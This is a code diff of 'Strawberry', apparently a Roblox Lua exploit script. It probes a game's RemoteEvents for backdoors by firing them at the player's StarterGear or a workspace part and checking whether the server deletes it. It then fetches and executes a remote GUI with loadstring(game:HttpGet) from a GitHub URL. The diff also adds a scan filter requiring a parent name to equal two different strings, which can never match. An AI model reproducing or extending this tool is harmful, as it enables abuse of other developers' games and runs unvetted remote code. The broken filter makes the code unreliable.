@@ -17,6 +17,7 @@ made by C:\Drive and Saji⠀⠀⠀
 
 C:\Drive - Gui, commands
 Saji - Commands, scanner
+Abuses Delete Remotes
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ]]--
 
@@ -42,6 +43,7 @@ local function notif(msg,dur)
 end; -- // notifys the user
 
 notif("Strawberry scanning! (be patient and dont re-execute the script)", 20);
+print("Strawberry: starting scan!");
 
 local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
 deletebind.Name = "deletebind";
@@ -59,27 +61,37 @@ coroutine.wrap(function()
 	until backdoored == true;
 end)(); -- // times how long it takes to find the backdoor
 
-local function isbackdoored(event)
+local function isbackdoored(remote)
 	local function deletetest(item)
-		event:FireServer(item);
+		remote:FireServer(item);
 	end;
-
-	local part = game.Players.LocalPlayer.StarterGear;
+	local part = nil;
+	if not game.Players.LocalPlayer:FindFirstChild("StarterGear") then
+		print("Strawberry: did not find startergear, using random workspace part! (this method may provide a false positive)");
+		part = workspace:FindFirstChildOfClass("BasePart");
+	else
+		print("Strawberry: testing delete on startergear")
+		part = game.Players.LocalPlayer.StarterGear;
+	end;
+	task.wait()
+	if part == nil then print("Strawberry: this remotes scan is corrupted, skipping remote.") return false end;
+	-- // code above stops the scan if the part is still nil (which would provide a false posititve)
 	local origParent = part.Parent;
 	task.wait();
 	deletetest(part);
-	task.wait(0.2);
-	if not part or part.Parent ~= origParent then
+	task.wait(0.1); -- // gives remote time to execute
+	if part.Parent ~= origParent then
 		return true; -- Backdoored
 	end; -- // checks if part deleted by checking the parent
 
+	print("Strawberry: remote scanned is not backdoored, going to next remote.");
 	return false; -- Not backdoored
 end;
 
 local function scan(root)
 	if backdoored == true then return end;
 	for i, v in pairs(root:GetDescendants()) do
-		if v:IsA("RemoteEvent") then
+		if v:IsA("RemoteEvent") and v.Parent.Name == "DefaultChatSystemChatEvents" and v.Parent.Name == "RobloxReplicatedStorage" then
 			if isbackdoored(v) == true then
 				backdoored = true;
 				event = v;
@@ -103,7 +115,7 @@ if not event then
 	notif("No backdoor found, sorry :(",5);
 end; -- // tells user if the game dev was too smart for a backdoor
 
-repeat task.wait(1.5) until backdoored == true; -- // creates the gui once the game is confirmed to be backdoored
+repeat task.wait() until backdoored == true; -- // creates the gui once the game is confirmed to be backdoored
 
 -- // boots up the backdoor gui after the backdoor is found :3
 loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v5.00.lua"))();
